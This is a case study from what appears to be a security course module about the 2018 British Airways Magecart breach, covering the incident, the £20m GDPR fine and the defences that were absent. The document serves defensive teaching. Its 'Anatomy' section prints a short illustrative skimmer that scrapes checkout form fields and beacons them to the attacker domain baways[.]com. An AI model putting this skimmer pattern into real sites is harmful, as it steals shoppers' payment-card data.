Module 16 · Case Study

British Airways — 2018 Magecart Breach

A concrete, consequential Magecart incident: roughly 22 lines of injected JavaScript skimmed around 380,000–430,000 payment-card records and led to one of the era's largest GDPR penalties. Small payload, enormous impact.

What happened

Attackers (a Magecart group) modified a JavaScript file that BA's website loaded — reporting at the time identified a customized Modernizr script on the payment path. The tampered script hooked the checkout form and, on submit, sent the entered card details to an attacker-controlled server whose domain (baways[.]com) was chosen to look BA-related. It also affected the mobile app, which loaded web components from the same compromised source. The skimmer ran for roughly two weeks before detection.

Anatomy (illustrative)

// ~ the shape of the injected handler on the payment page
$('#submitButton').bind('mouseup touchend', function(){
  var data = {};
  $('input[name]').each(function(){ data[this.name] = this.value; });   // scrape all fields
  navigator.sendBeacon('https://baways[.]com/gateway/app/dataprocessing/api/',
                       JSON.stringify(data));                            // exfiltrate
});

Note how little is needed: one event binding, a field scrape, one beacon. This is Module 15's "same-origin JS owns the page" and Module 11's "phone home" in production form.

The absent defenses (each would have helped)

  • Subresource Integrity (SRI): an integrity hash on the loaded script would have caused the tampered file to be rejected by the browser.
  • Content Security Policy connect-src: restricting outbound connections to known hosts would have blocked the beacon to baways[.]com. CSP reporting could also have surfaced the anomaly.
  • Payment-field isolation (hosted fields / payment iframe on a separate origin): the Same-Origin Policy would have prevented first-party script from reading the card inputs at all — arguably the strongest architectural control for card data.
  • Script integrity monitoring / minimizing third-party code on payment pages: fewer, pinned, monitored scripts shrink the attack surface.

The regulatory coda

The UK ICO initially signaled a very large fine (~£183m) and ultimately imposed £20m under GDPR, citing inadequate security measures. For a defender this reframes XSS/skimming from "a bug" to "a board-level financial and legal risk," which is exactly the framing that gets defensive research funded and deployed.

Lesson for defenders

BA 2018 is the definitive argument that the browser is the payment terminal, and that defending it requires egress control + integrity + isolation, not just input validation. Any Module 18 intervention aimed at this class should be evaluated on three axes: does it stop the script loading (integrity), stop it reading secrets (isolation), or stop it exfiltrating (egress/CSP)? Defenses that touch only one axis leave a viable attack path.
